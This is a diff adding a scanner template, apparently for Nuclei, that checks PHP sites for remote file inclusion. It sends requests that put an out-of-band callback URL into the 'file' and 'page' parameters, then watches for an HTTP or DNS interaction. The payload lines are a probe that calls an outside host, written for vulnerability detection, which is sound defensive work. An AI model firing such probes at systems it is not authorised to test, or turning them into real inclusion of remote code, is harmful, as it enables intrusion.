@@ -1,0 +1,24 @@
+id: whai-rfi-php
+
+info:
+  name: Remote File Inclusion (PHP)
+  author: whitehat-ai
+  severity: critical
+  description: Tests PHP file inclusion with remote URLs
+  tags: rfi,php,critical
+  classification:
+    cwe-id: CWE-98
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?file=http://{{interactsh-url}}/test"
+      - "{{BaseURL}}/?page=http://{{interactsh-url}}/test"
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "http"
+          - "dns"
+        condition: or
